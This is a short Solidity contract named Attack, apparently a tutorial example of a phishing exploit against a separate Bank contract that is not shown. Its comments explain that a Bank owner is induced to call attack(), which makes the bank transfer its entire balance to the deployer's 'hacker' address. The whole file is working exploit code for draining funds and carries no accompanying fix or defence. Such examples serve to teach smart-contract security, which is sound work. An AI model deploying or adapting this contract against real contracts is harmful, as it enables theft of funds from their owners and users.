contract Attack {
    // Beneficiary address
    address payable public hacker;
    // Bank contract address
    Bank bank;

    constructor(Bank _bank) {
        // Forces the conversion of the address type _bank to the Bank type
        bank = Bank(_bank);
        // Assigns the beneficiary address to the deployer's address
        hacker = payable(msg.sender);
    }

    function attack() public {
        // Induces the owner of the Bank contract to call, transferring all the balance to the hacker's address
        bank.transfer(hacker, address(bank).balance);
    }
}
